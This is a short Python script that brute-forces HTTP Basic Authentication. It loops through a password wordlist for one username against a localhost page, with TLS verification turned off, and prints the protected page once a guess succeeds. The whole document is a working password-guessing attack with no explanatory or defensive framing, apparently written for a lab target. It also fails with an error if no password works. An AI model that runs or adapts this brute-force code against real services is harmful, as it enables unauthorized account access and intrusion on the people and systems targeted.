import requests
from bs4 import BeautifulSoup

url = 'http://localhost/token/index.html'
username = 'some-user'
password_dict = "THE LIST   .txt"
timeout = 5

lines = [line.rstrip('\n') for line in open(password_dict)]

for password in lines:
    print("Trying with password: ", password)
    auth = requests.auth.HTTPBasicAuth(username, password)
    resp = requests.get(url=url, auth=auth, verify=False, timeout=timeout)
    if "Authorization Required" not in str(resp.text):
        print("Login successful with password: ", password)
        soup = BeautifulSoup(resp.text, 'html.parser')
        break

print(soup.prettify())
